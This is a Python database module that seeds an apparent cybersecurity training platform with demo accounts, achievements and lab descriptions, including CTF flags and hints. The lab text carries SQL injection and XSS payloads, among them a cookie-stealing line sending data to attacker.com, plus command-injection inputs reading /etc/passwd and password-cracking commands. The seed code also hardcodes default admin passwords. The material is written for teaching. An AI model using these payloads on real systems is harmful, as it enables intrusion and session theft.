from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Text, Float, ForeignKey, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship
from datetime import datetime
import os

DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///./cyberlab.db")

engine = create_engine(
    DATABASE_URL,
    connect_args={"check_same_thread": False} if "sqlite" in DATABASE_URL else {}
)

SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True, nullable=False)
    email = Column(String, unique=True, index=True, nullable=False)
    hashed_password = Column(String, nullable=False)
    full_name = Column(String)
    avatar = Column(String, default="default")
    role = Column(String, default="student")
    xp = Column(Integer, default=0)
    level = Column(Integer, default=1)
    rank = Column(String, default="Newbie")
    streak = Column(Integer, default=0)
    last_active = Column(DateTime, default=datetime.utcnow)
    joined_at = Column(DateTime, default=datetime.utcnow)
    is_active = Column(Boolean, default=True)
    progress = relationship("UserProgress", back_populates="user")
    achievements = relationship("UserAchievement", back_populates="user")


class Lab(Base):
    __tablename__ = "labs"
    id = Column(Integer, primary_key=True, index=True)
    slug = Column(String, unique=True, index=True)
    title = Column(String, nullable=False)
    description = Column(Text)
    category = Column(String)  # web, network, crypto, forensics, reversing
    difficulty = Column(String)  # beginner, intermediate, advanced
    xp_reward = Column(Integer, default=100)
    estimated_time = Column(Integer, default=30)  # minutes
    tags = Column(JSON, default=[])
    prerequisites = Column(JSON, default=[])
    is_active = Column(Boolean, default=True)
    order_index = Column(Integer, default=0)
    instructions = Column(Text)
    hints = Column(JSON, default=[])
    flag = Column(String)  # CTF flag for completion
    tools = Column(JSON, default=[])
    tasks = Column(JSON, default=[])
    created_at = Column(DateTime, default=datetime.utcnow)
    progress = relationship("UserProgress", back_populates="lab")


class UserProgress(Base):
    __tablename__ = "user_progress"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    lab_id = Column(Integer, ForeignKey("labs.id"))
    status = Column(String, default="not_started")  # not_started, in_progress, completed
    progress_pct = Column(Float, default=0.0)
    completed_tasks = Column(JSON, default=[])
    hints_used = Column(Integer, default=0)
    attempts = Column(Integer, default=0)
    time_spent = Column(Integer, default=0)  # seconds
    started_at = Column(DateTime)
    completed_at = Column(DateTime)
    notes = Column(Text)
    user = relationship("User", back_populates="progress")
    lab = relationship("Lab", back_populates="progress")


class Achievement(Base):
    __tablename__ = "achievements"
    id = Column(Integer, primary_key=True, index=True)
    slug = Column(String, unique=True)
    title = Column(String)
    description = Column(Text)
    icon = Column(String)
    xp_reward = Column(Integer, default=50)
    condition_type = Column(String)
    condition_value = Column(Integer)
    users = relationship("UserAchievement", back_populates="achievement")


class UserAchievement(Base):
    __tablename__ = "user_achievements"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    achievement_id = Column(Integer, ForeignKey("achievements.id"))
    earned_at = Column(DateTime, default=datetime.utcnow)
    user = relationship("User", back_populates="achievements")
    achievement = relationship("Achievement", back_populates="users")


class TerminalSession(Base):
    __tablename__ = "terminal_sessions"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    lab_id = Column(Integer, ForeignKey("labs.id"))
    session_id = Column(String, unique=True, index=True)
    history = Column(JSON, default=[])
    environment = Column(JSON, default={})
    created_at = Column(DateTime, default=datetime.utcnow)
    last_active = Column(DateTime, default=datetime.utcnow)


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def init_db():
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()
    try:
        _seed_data(db)
    finally:
        db.close()


def _seed_data(db):
    from passlib.context import CryptContext
    pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

    # Check if already seeded
    if db.query(User).first():
        return

    # Seed admin user
    admin = User(
        username="admin",
        email="admin@cyberlab.io",
        hashed_password=pwd_context.hash("Admin@123"),
        full_name="Admin User",
        role="admin",
        xp=5000,
        level=10,
        rank="Elite Hacker"
    )
    demo = User(
        username="demo",
        email="demo@cyberlab.io",
        hashed_password=pwd_context.hash("Demo@123"),
        full_name="Demo User",
        role="student",
        xp=350,
        level=2,
        rank="Script Kiddie"
    )
    db.add_all([admin, demo])

    # Seed achievements
    achievements = [
        Achievement(slug="first_blood", title="First Blood", description="Complete your first lab", icon="🩸", xp_reward=50, condition_type="labs_completed", condition_value=1),
        Achievement(slug="sql_master", title="SQL Slayer", description="Complete all SQL injection labs", icon="💉", xp_reward=200, condition_type="category_completed", condition_value=1),
        Achievement(slug="speed_demon", title="Speed Demon", description="Complete a lab in under 5 minutes", icon="⚡", xp_reward=100, condition_type="fast_completion", condition_value=300),
        Achievement(slug="no_hints", title="Purist", description="Complete a lab without using hints", icon="🎯", xp_reward=150, condition_type="no_hints", condition_value=1),
        Achievement(slug="five_labs", title="Getting Started", description="Complete 5 labs", icon="🔥", xp_reward=100, condition_type="labs_completed", condition_value=5),
        Achievement(slug="xp_1000", title="Leveling Up", description="Earn 1000 XP", icon="⭐", xp_reward=0, condition_type="xp", condition_value=1000),
    ]
    db.add_all(achievements)

    # Seed labs
    labs = [
        # === WEB EXPLOITATION ===
        Lab(
            slug="sql-injection-basics",
            title="SQL Injection: The Basics",
            description="Learn how SQL injection attacks work and how to exploit vulnerable login forms. Understand the fundamentals of database manipulation through user input.",
            category="web",
            difficulty="beginner",
            xp_reward=150,
            estimated_time=20,
            tags=["sql", "web", "injection", "databases"],
            prerequisites=[],
            order_index=1,
            instructions="""## SQL Injection Basics

### What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It allows attackers to view, modify, or delete data.

### How it Works

When user input is directly concatenated into SQL queries without proper sanitization, an attacker can inject malicious SQL code.

**Vulnerable Code Example:**
```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

If the username field receives: `admin' --`
The query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
The `--` comments out the rest of the query!

### Your Mission

1. Navigate to the vulnerable login form in the terminal below
2. Use SQL injection to bypass authentication
3. Extract the admin's secret flag from the database
4. Submit the flag to complete this lab

### Common Payloads to Try
- `' OR '1'='1`
- `admin' --`
- `' OR 1=1 --`
- `' UNION SELECT 1,2,3 --`

### Tools Available
- Built-in Terminal (sqlmap simulation)
- HTTP Request Inspector
- Database Schema Viewer
""",
            hints=[
                "Try using a single quote (') to break the SQL query syntax",
                "The comment sequence -- can be used to ignore the rest of a query",
                "Try: username = admin' -- and any password",
                "The flag is stored in a table called 'secrets'"
            ],
            flag="FLAG{sql_1nj3ct10n_byp4ss_1337}",
            tools=["sqlmap", "curl", "burpsuite"],
            tasks=[
                {"id": 1, "title": "Identify the injection point", "description": "Find where user input is used in SQL queries", "xp": 30},
                {"id": 2, "title": "Bypass authentication", "description": "Login as admin without knowing the password", "xp": 50},
                {"id": 3, "title": "Extract the flag", "description": "Find and submit the secret flag", "xp": 70},
            ]
        ),
        Lab(
            slug="sql-injection-union",
            title="SQL Injection: UNION Attacks",
            description="Master UNION-based SQL injection to extract data from different database tables. Learn to enumerate columns and retrieve sensitive information.",
            category="web",
            difficulty="intermediate",
            xp_reward=250,
            estimated_time=35,
            tags=["sql", "web", "union", "enumeration"],
            prerequisites=["sql-injection-basics"],
            order_index=2,
            instructions="""## UNION-Based SQL Injection

### Overview

UNION attacks allow you to retrieve data from other tables in the database. The key requirement is that:
1. Individual queries must return the same number of columns
2. Data types must be compatible

### Step 1: Find the Number of Columns

Use ORDER BY to determine columns:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  ← Error? Then 2 columns exist
```

Or use NULL values:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2: Find String Columns

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

### Step 3: Extract Data

```sql
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Your Targets

The database has a hidden `admin_secrets` table. Extract all records!
""",
            hints=[
                "Start by determining the number of columns using ORDER BY",
                "Use information_schema.tables to list all tables",
                "The admin_secrets table has columns: id, secret_key, value",
                "Try: ' UNION SELECT secret_key,value FROM admin_secrets--"
            ],
            flag="FLAG{un10n_4tt4ck_m4st3r_2024}",
            tools=["sqlmap", "curl", "burpsuite"],
            tasks=[
                {"id": 1, "title": "Determine column count", "description": "Find how many columns the query returns", "xp": 50},
                {"id": 2, "title": "Enumerate tables", "description": "List all tables in the database", "xp": 75},
                {"id": 3, "title": "Extract admin secrets", "description": "Dump the admin_secrets table", "xp": 125},
            ]
        ),
        Lab(
            slug="xss-reflected",
            title="Cross-Site Scripting (XSS): Reflected",
            description="Understand and exploit reflected XSS vulnerabilities. Learn how malicious scripts can be injected and executed in victims' browsers.",
            category="web",
            difficulty="beginner",
            xp_reward=150,
            estimated_time=25,
            tags=["xss", "web", "javascript", "client-side"],
            prerequisites=[],
            order_index=3,
            instructions="""## Reflected XSS Attacks

### What is XSS?

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. In reflected XSS, the malicious script comes from the current HTTP request.

### How it Works

When a web application includes unvalidated user input in its output, attackers can craft URLs containing malicious scripts.

**Vulnerable endpoint:**
```
https://target.com/search?q=<INJECTION_HERE>
```

### Basic Payloads

Test for XSS:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

### Steal Cookies

```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Your Mission

1. Find the XSS vulnerability in the search functionality
2. Craft a payload that steals the admin session cookie  
3. Use the stolen cookie to access admin panel
4. Retrieve the flag
""",
            hints=[
                "Try entering <script>alert(1)</script> in the search box",
                "If angle brackets are filtered, try event handlers like onerror",
                "The admin visits your shared link automatically (simulated)",
                "Cookie theft payload: document.cookie"
            ],
            flag="FLAG{r3fl3ct3d_xss_pwn3d}",
            tools=["burpsuite", "curl"],
            tasks=[
                {"id": 1, "title": "Trigger basic XSS", "description": "Execute an alert() popup", "xp": 40},
                {"id": 2, "title": "Steal admin cookie", "description": "Exfiltrate the admin session cookie", "xp": 60},
                {"id": 3, "title": "Access admin panel", "description": "Use stolen cookie to access admin area", "xp": 50},
            ]
        ),
        Lab(
            slug="command-injection",
            title="OS Command Injection",
            description="Explore command injection vulnerabilities in web applications. Learn how improper input handling can lead to remote code execution.",
            category="web",
            difficulty="intermediate",
            xp_reward=200,
            estimated_time=30,
            tags=["command-injection", "rce", "linux", "web"],
            prerequisites=["xss-reflected"],
            order_index=4,
            instructions="""## OS Command Injection

### Overview

Command injection occurs when an attacker can execute arbitrary OS commands on the server. This happens when user-supplied data is passed to a system shell.

### Vulnerable Code

```python
import os
def ping_host(ip):
    result = os.system("ping -c 1 " + ip)
    return result
```

If `ip = "8.8.8.8; cat /etc/passwd"` → executes both commands!

### Operators

| Operator | Behavior |
|----------|----------|
| `;` | Run both commands |
| `&&` | Run second if first succeeds |
| `\|\|` | Run second if first fails |
| `` ` `` | Command substitution |
| `$()` | Command substitution |

### Bypass Techniques

```bash
# Space bypass
${IFS}cat${IFS}/etc/passwd

# Quote bypass  
c'at' /etc/passwd

# Encoding
%3B%20cat%20/etc/passwd
```

### Goal

The target app has a ping functionality. Exploit it to read /flag.txt
""",
            hints=[
                "Try appending ; ls to the IP address field",
                "Use ; cat /flag.txt to read the flag file",
                "If semicolons are filtered, try && or | operators",
                "URL encode your payload if submitting via URL parameters"
            ],
            flag="FLAG{0s_cmnd_1nj3ct10n_rce}",
            tools=["curl", "burpsuite"],
            tasks=[
                {"id": 1, "title": "Detect command injection", "description": "Confirm the vulnerability exists", "xp": 50},
                {"id": 2, "title": "List server files", "description": "Execute ls command on the server", "xp": 60},
                {"id": 3, "title": "Read the flag", "description": "Read /flag.txt contents", "xp": 90},
            ]
        ),
        # === NETWORK ===
        Lab(
            slug="nmap-fundamentals",
            title="Network Scanning with Nmap",
            description="Master the art of network reconnaissance using Nmap. Learn port scanning, service detection, OS fingerprinting, and script scanning.",
            category="network",
            difficulty="beginner",
            xp_reward=120,
            estimated_time=20,
            tags=["nmap", "reconnaissance", "network", "scanning"],
            prerequisites=[],
            order_index=10,
            instructions="""## Nmap Fundamentals

### What is Nmap?

Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. It's used for:
- Host discovery
- Port scanning  
- Service version detection
- OS detection
- Vulnerability scanning with scripts

### Basic Syntax

```bash
nmap [options] [target]
```

### Essential Scan Types

```bash
# TCP SYN Scan (default, requires root)
nmap -sS 192.168.1.1

# TCP Connect Scan
nmap -sT 192.168.1.1

# UDP Scan
nmap -sU 192.168.1.1

# Comprehensive Scan
nmap -A -T4 192.168.1.1
```

### Common Options

| Flag | Description |
|------|-------------|
| `-p 80,443` | Specific ports |
| `-p 1-1000` | Port range |
| `-p-` | All 65535 ports |
| `-sV` | Version detection |
| `-O` | OS detection |
| `-A` | Aggressive (OS + version + scripts) |
| `-T4` | Fast timing |
| `--script vuln` | Vulnerability scripts |

### Your Mission

Scan the target host (10.10.10.1) and discover:
1. Open ports
2. Running services and versions
3. Operating system
4. Any known vulnerabilities
""",
            hints=[
                "Start with a basic scan: nmap 10.10.10.1",
                "Use -sV to detect service versions",
                "Try -A for comprehensive information",
                "Use --script vuln to check for vulnerabilities"
            ],
            flag="FLAG{nmap_r3c0n_m4st3r}",
            tools=["nmap"],
            tasks=[
                {"id": 1, "title": "Basic port scan", "description": "Identify all open ports", "xp": 30},
                {"id": 2, "title": "Service enumeration", "description": "Identify services and versions on open ports", "xp": 50},
                {"id": 3, "title": "OS fingerprinting", "description": "Determine the target operating system", "xp": 40},
            ]
        ),
        Lab(
            slug="wireshark-packet-analysis",
            title="Packet Analysis with Wireshark",
            description="Analyze network traffic with Wireshark. Learn to capture, filter, and dissect packets to uncover hidden information.",
            category="network",
            difficulty="beginner",
            xp_reward=130,
            estimated_time=25,
            tags=["wireshark", "pcap", "network", "forensics"],
            prerequisites=["nmap-fundamentals"],
            order_index=11,
            instructions="""## Wireshark Packet Analysis

### Introduction

Wireshark is the world's most popular network protocol analyzer. It lets you capture and interactively browse network traffic.

### Key Concepts

**Display Filters (most important skill!):**

```
# Filter by protocol
http
dns
tcp
udp
icmp

# Filter by IP
ip.addr == 192.168.1.1
ip.src == 10.0.0.1
ip.dst == 10.0.0.2

# Filter by port
tcp.port == 80
tcp.dstport == 443

# Combine filters
http && ip.src == 192.168.1.100
tcp.port == 80 || tcp.port == 443
```

### Finding Credentials in Traffic

Look for:
- HTTP POST requests (login forms)
- FTP authentication (cleartext)
- Telnet sessions (cleartext)
- Basic Auth headers (base64 encoded)

### Following Streams

Right-click any packet → Follow → TCP Stream

This reconstructs the entire conversation!

### Your Mission

Analyze the provided PCAP file to:
1. Find HTTP credentials transmitted in cleartext
2. Identify a secret file that was downloaded
3. Reconstruct a TCP stream to find the hidden flag
""",
            hints=[
                "Filter for http.request.method == POST to find login attempts",
                "Look at FTP traffic for credentials",
                "Use 'Follow TCP Stream' on interesting conversations",
                "The flag is encoded in base64 somewhere in the traffic"
            ],
            flag="FLAG{p4ck3t_4n4lys1s_pr0}",
            tools=["wireshark", "tcpdump"],
            tasks=[
                {"id": 1, "title": "Find HTTP credentials", "description": "Extract username and password from HTTP traffic", "xp": 50},
                {"id": 2, "title": "Identify file transfer", "description": "Find what file was transferred via FTP", "xp": 40},
                {"id": 3, "title": "Reconstruct the flag", "description": "Follow the TCP stream to find the flag", "xp": 40},
            ]
        ),
        # === CRYPTOGRAPHY ===
        Lab(
            slug="crypto-caesar-cipher",
            title="Classical Ciphers: Caesar & ROT13",
            description="Break classical substitution ciphers through frequency analysis and brute force. Understand the foundations of cryptography.",
            category="crypto",
            difficulty="beginner",
            xp_reward=100,
            estimated_time=15,
            tags=["crypto", "cipher", "classical", "frequency-analysis"],
            prerequisites=[],
            order_index=20,
            instructions="""## Classical Ciphers

### Caesar Cipher

One of the earliest encryption techniques. Each letter is shifted by a fixed number.

**Example (shift 3):**
```
Plain:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Cipher: D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
```

`HELLO` → `KHOOR`

### Breaking Caesar Cipher

**Method 1: Brute Force**
Try all 26 possible shifts and look for readable text.

**Method 2: Frequency Analysis**
In English, the most common letters are: E, T, A, O, I, N, S
The most common cipher letter likely maps to E.

### ROT13

A special case of Caesar cipher with shift of 13.
ROT13(ROT13(x)) = x (self-inverse!)

```python
import codecs
codecs.encode('Hello', 'rot_13')  # 'Uryyb'
```

### Vigenère Cipher

Uses a keyword instead of a single shift:
```
Key:    K E Y K E Y K E Y
Plain:  A T T A C K A T T
Cipher: K X R K G I K X R
```

### Your Challenge

Decrypt these messages:
1. `Gur synt vf: synttfu{ebg13_vf_abg_rapelcgvba}`
2. `KHOOR ZRUOG` (shift = ?)
3. A Vigenère encrypted message with key "CYBER"
""",
            hints=[
                "ROT13 can be decoded with ROT13 again - it's symmetric!",
                "For Caesar, try shift 3 first, then brute force",
                "Vigenère hint: the key is CYBER (5 letters)",
                "Python: chr((ord(c) - ord('A') - shift) % 26 + ord('A'))"
            ],
            flag="FLAG{cl4ss1c4l_crypt0_cr4ck3d}",
            tools=["python3"],
            tasks=[
                {"id": 1, "title": "Decode ROT13", "description": "Decrypt the ROT13 encoded message", "xp": 25},
                {"id": 2, "title": "Break Caesar cipher", "description": "Find the shift and decrypt the message", "xp": 35},
                {"id": 3, "title": "Crack Vigenère", "description": "Decrypt the Vigenère encoded message", "xp": 40},
            ]
        ),
        Lab(
            slug="hash-cracking",
            title="Password Hash Cracking",
            description="Learn to crack common password hashes using dictionary attacks, rainbow tables, and brute force with Hashcat and John the Ripper.",
            category="crypto",
            difficulty="intermediate",
            xp_reward=200,
            estimated_time=30,
            tags=["hashcat", "john", "passwords", "hashing", "md5"],
            prerequisites=["crypto-caesar-cipher"],
            order_index=21,
            instructions="""## Password Hash Cracking

### Common Hash Types

| Hash | Example | Length |
|------|---------|--------|
| MD5 | `5f4dcc3b5aa765d61d8327de...` | 32 chars |
| SHA1 | `5baa61e4c9b93f3f0682250b...` | 40 chars |
| SHA256 | `6b86b273ff34fce19d6b804e...` | 64 chars |
| bcrypt | `$2a$12$...` | 60 chars |
| NTLM | Windows password hash | 32 chars |

### Identify Hash Type

```bash
# Using hash-identifier
hash-identifier [hash]

# Using hashid
hashid [hash]
```

### Hashcat

```bash
# Dictionary attack (MD5)
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Brute force (4-digit PIN)
hashcat -m 0 -a 3 hash.txt ?d?d?d?d

# Rules
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule
```

### John the Ripper

```bash
# Auto-detect format
john hash.txt --wordlist=rockyou.txt

# Specific format
john hash.txt --format=md5 --wordlist=rockyou.txt

# Show cracked
john hash.txt --show
```

### Challenge Hashes

Crack these hashes:
1. `5f4dcc3b5aa765d61d8327deb882cf99` (MD5)
2. `e10adc3949ba59abbe56e057f20f883e` (MD5)  
3. `$2a$12$xyz...` (bcrypt challenge)
""",
            hints=[
                "The first MD5 hash is a very common password",
                "Use rockyou.txt wordlist for dictionary attacks",
                "Hash 1 decodes to: password",
                "Hash 2 is: 123456 - always try common passwords first!"
            ],
            flag="FLAG{h4sh_cr4ck1ng_m4st3r}",
            tools=["hashcat", "john", "python3"],
            tasks=[
                {"id": 1, "title": "Identify hash types", "description": "Determine the hash algorithm used", "xp": 30},
                {"id": 2, "title": "Crack MD5 hashes", "description": "Recover the plaintext passwords", "xp": 80},
                {"id": 3, "title": "Submit the flag", "description": "Combine the cracked passwords to form the flag", "xp": 90},
            ]
        ),
        # === FORENSICS ===
        Lab(
            slug="steganography-basics",
            title="Steganography: Hidden in Plain Sight",
            description="Discover hidden data concealed within images, audio files, and text. Learn steganography detection and extraction techniques.",
            category="forensics",
            difficulty="beginner",
            xp_reward=120,
            estimated_time=20,
            tags=["steganography", "forensics", "images", "hidden-data"],
            prerequisites=[],
            order_index=30,
            instructions="""## Steganography

### What is Steganography?

The practice of hiding secret data within ordinary, non-secret data. Unlike encryption, steganography conceals the *existence* of the message.

### Common Techniques

**LSB (Least Significant Bit) in Images:**
Each pixel's color has 8 bits. Changing the last bit barely affects color but can store data.

```
Original: 11001100 (204)
Modified: 11001101 (205) ← Almost identical!
```

**Metadata:**
Files contain hidden metadata (EXIF for images):
```bash
exiftool image.jpg
strings image.jpg
```

**File Appending:**
Data can be appended after the file's end marker.

### Tools

```bash
# Check file type
file mystery.jpg

# Extract strings
strings mystery.jpg

# EXIF data
exiftool mystery.jpg

# Steghide (embed/extract)
steghide extract -sf image.jpg

# Binwalk (find embedded files)
binwalk mystery.jpg
binwalk -e mystery.jpg  # extract

# Zsteg (PNG/BMP LSB)
zsteg mystery.png
```

### Your Mission

An operative has hidden a secret message inside the provided image file. Extract it!
""",
            hints=[
                "Start with 'file' and 'strings' commands",
                "Check EXIF metadata with exiftool",
                "Try steghide with an empty password first",
                "binwalk can reveal hidden files within files"
            ],
            flag="FLAG{st3g4n0gr4phy_d3t3ct3d}",
            tools=["steghide", "binwalk", "exiftool", "strings"],
            tasks=[
                {"id": 1, "title": "Analyze file metadata", "description": "Extract and analyze EXIF/metadata", "xp": 30},
                {"id": 2, "title": "Run binwalk analysis", "description": "Check for embedded files", "xp": 40},
                {"id": 3, "title": "Extract hidden message", "description": "Recover the steganographically hidden data", "xp": 50},
            ]
        ),
    ]
    db.add_all(labs)
    db.commit()
    print("✅ Database seeded successfully!")
